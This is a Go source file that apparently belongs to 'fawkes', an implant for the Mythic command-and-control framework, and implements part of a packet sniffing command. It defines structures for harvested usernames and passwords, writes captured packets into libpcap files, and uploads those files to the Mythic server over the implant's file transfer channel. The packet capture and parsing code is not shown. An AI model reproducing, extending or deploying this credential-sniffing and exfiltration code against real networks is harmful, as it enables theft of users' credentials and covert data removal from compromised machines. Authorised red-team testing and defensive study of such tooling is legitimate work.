package commands

import (
	"encoding/binary"
	"fmt"
	"sync"
	"time"

	"fawkes/pkg/structs"
)

type sniffParams struct {
	Interface   string `json:"interface"`
	Duration    int    `json:"duration"`
	MaxBytes    int64  `json:"max_bytes"`
	Ports       string `json:"ports"`
	Promiscuous bool   `json:"promiscuous"`
	SavePCAP    bool   `json:"save_pcap"`
}

type sniffCredential struct {
	Protocol  string `json:"protocol"`
	SrcIP     string `json:"src_ip"`
	SrcPort   uint16 `json:"src_port"`
	DstIP     string `json:"dst_ip"`
	DstPort   uint16 `json:"dst_port"`
	Username  string `json:"username"`
	Password  string `json:"password,omitempty"`
	Detail    string `json:"detail,omitempty"`
	Timestamp int64  `json:"timestamp"`
}

type sniffResult struct {
	Duration      string             `json:"duration"`
	PacketCount   int                `json:"packet_count"`
	BytesCaptured int64              `json:"bytes_captured"`
	Credentials   []*sniffCredential `json:"credentials"`
	Errors        []string           `json:"errors,omitempty"`
	PCAPFileID    string             `json:"pcap_file_id,omitempty"`
}

// sniffPCAPCollector collects raw packets for PCAP file generation.
type sniffPCAPCollector struct {
	mu      sync.Mutex
	packets []sniffPCAPPacket
	maxSize int64
	size    int64
}

type sniffPCAPPacket struct {
	timestamp time.Time
	data      []byte
}

func newSniffPCAPCollector(maxSize int64) *sniffPCAPCollector {
	return &sniffPCAPCollector{maxSize: maxSize}
}

func (c *sniffPCAPCollector) addPacket(data []byte) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.size+int64(len(data)) > c.maxSize {
		return // Drop packet if over size limit
	}
	pkt := sniffPCAPPacket{
		timestamp: time.Now(),
		data:      make([]byte, len(data)),
	}
	copy(pkt.data, data)
	c.packets = append(c.packets, pkt)
	c.size += int64(len(data))
}

// buildPCAP generates a libpcap-format file from collected packets.
// Uses the standard pcap file format (magic 0xA1B2C3D4).
func (c *sniffPCAPCollector) buildPCAP(linkType uint32) []byte {
	c.mu.Lock()
	defer c.mu.Unlock()

	// Estimate total size: 24 (global header) + N * (16 + packet_len)
	totalSize := 24
	for _, p := range c.packets {
		totalSize += 16 + len(p.data)
	}

	buf := make([]byte, 0, totalSize)

	// PCAP Global Header (24 bytes)
	hdr := make([]byte, 24)
	binary.LittleEndian.PutUint32(hdr[0:4], 0xA1B2C3D4) // magic
	binary.LittleEndian.PutUint16(hdr[4:6], 2)          // version major
	binary.LittleEndian.PutUint16(hdr[6:8], 4)          // version minor
	binary.LittleEndian.PutUint32(hdr[8:12], 0)         // thiszone
	binary.LittleEndian.PutUint32(hdr[12:16], 0)        // sigfigs
	binary.LittleEndian.PutUint32(hdr[16:20], 65535)    // snaplen
	binary.LittleEndian.PutUint32(hdr[20:24], linkType) // link type
	buf = append(buf, hdr...)

	// Per-packet records
	for _, p := range c.packets {
		rec := make([]byte, 16)
		binary.LittleEndian.PutUint32(rec[0:4], uint32(p.timestamp.Unix()))
		binary.LittleEndian.PutUint32(rec[4:8], uint32(p.timestamp.Nanosecond()/1000)) // microseconds
		binary.LittleEndian.PutUint32(rec[8:12], uint32(len(p.data)))                  // incl_len
		binary.LittleEndian.PutUint32(rec[12:16], uint32(len(p.data)))                 // orig_len
		buf = append(buf, rec...)
		buf = append(buf, p.data...)
	}

	return buf
}

type packetMeta struct {
	SrcIP   string
	DstIP   string
	SrcPort uint16
	DstPort uint16
}

// sniffUploadPCAP uploads a PCAP file to Mythic using the file transfer channel.
func sniffUploadPCAP(task *structs.Task, pcapData []byte, result *sniffResult) {
	uploadMsg := structs.SendFileToMythicStruct{}
	uploadMsg.Task = task
	uploadMsg.IsScreenshot = false
	uploadMsg.SendUserStatusUpdates = false
	uploadMsg.Data = &pcapData
	uploadMsg.FileName = fmt.Sprintf("sniff_%s.pcap", time.Now().Format("20060102_150405"))
	uploadMsg.FullPath = ""
	uploadMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- uploadMsg

	// Wait for transfer (with timeout)
	select {
	case <-uploadMsg.FinishedTransfer:
		result.PCAPFileID = uploadMsg.FileName
	case <-time.After(60 * time.Second):
		result.Errors = append(result.Errors, "PCAP upload timed out")
	}
}
